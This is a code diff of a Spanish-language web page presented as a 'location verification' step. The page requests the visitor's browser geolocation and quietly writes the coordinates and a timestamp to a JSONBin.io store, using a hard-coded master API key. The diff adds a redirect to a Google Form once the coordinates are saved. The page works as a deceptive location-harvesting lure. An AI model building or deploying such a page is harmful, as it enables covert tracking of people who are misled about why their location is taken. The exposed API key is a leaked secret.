@@ -6,26 +6,18 @@
     <title>Verificación de Ubicación</title>
     <style>
         body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
-        #contenido { display: none; }
     </style>
 </head>
 <body>
-    <div id="verificacion">
-        <h1>Verificación de ubicación</h1>
-        <p id="status">Por favor, permite el acceso a la ubicación para continuar.</p>
-    </div>
-
-    <div id="contenido">
-        <h1>Bienvenido a la página</h1>
-        <p>Este contenido solo se muestra si permitiste la geolocalización.</p>
-    </div>
+    <h1>Verificación de ubicación</h1>
+    <p id="status">Esperando autorización de ubicación...</p>
 
     <script>
         const binID = "67a913afacd3cb34a8dbbece";  // Tu Bin ID de JSONBin.io
-        const apiKey = "$2a$10$d8vpiFShY60AL.tlX76vJOAVRCPpXjnozM3HnTlYsn1p4ksVvG896";  // Reemplázalo con tu API Key de JSONBin.io
+        const apiKey = "$2a$10$d8vpiFShY60AL.tlX76vJOAVRCPpXjnozM3HnTlYsn1p4ksVvG896";  // Tu API Key
+        const redireccionURL = "https://docs.google.com/forms/d/1D_CcVmuFw8by0tCKdR7fN1RV9P_mX8lR2HkexcnGt1I/edit";  // 🔴 FORMULARIO DE GOOGLE
 
         function registrarUbicacion(lat, lon) {
-            // Obtener los datos actuales del bin
             fetch(`https://api.jsonbin.io/v3/b/${binID}/latest`, {
                 method: "GET",
                 headers: { "X-Master-Key": apiKey }
@@ -40,7 +32,6 @@
                     fecha: new Date().toISOString()
                 });
 
-                // Guardar los datos actualizados
                 fetch(`https://api.jsonbin.io/v3/b/${binID}`, {
                     method: "PUT",
                     headers: { 
@@ -48,33 +39,30 @@
                         "X-Master-Key": apiKey 
                     },
                     body: JSON.stringify({ visitas })
-                });
+                })
+                .then(() => {
+                    console.log("Ubicación guardada correctamente");
+                    window.location.href = redireccionURL; //
+                })
+                .catch(error => console.error("Error al guardar ubicación:", error));
             })
-            .catch(error => console.error("Error al obtener datos:", error));
+            .catch(error => console.error("Error en JSONBin:", error));
         }
 
-        function solicitarUbicacion() {
-            if ("geolocation" in navigator) {
-                navigator.geolocation.getCurrentPosition(
-                    function(position) {
-                        let lat = position.coords.latitude;
-                        let lon = position.coords.longitude;
-
-                        registrarUbicacion(lat, lon);
-
-                        document.getElementById("verificacion").style.display = "none";
-                        document.getElementById("contenido").style.display = "block";
-                    },
-                    function(error) {
-                        document.getElementById("status").innerText = "Debes permitir la ubicación para ver el contenido.";
-                    }
-                );
-            } else {
-                document.getElementById("status").innerText = "Geolocalización no soportada.";
-            }
+        if ("geolocation" in navigator) {
+            navigator.geolocation.getCurrentPosition(
+                function(position) {
+                    let lat = position.coords.latitude;
+                    let lon = position.coords.longitude;
+                    registrarUbicacion(lat, lon);
+                },
+                function(error) {
+                    document.getElementById("status").innerText = "Debes permitir la ubicación para continuar.";
+                }
+            );
+        } else {
+            document.getElementById("status").innerText = "Geolocalización no soportada.";
         }
-
-        solicitarUbicacion();
     </script>
 </body>
 </html>
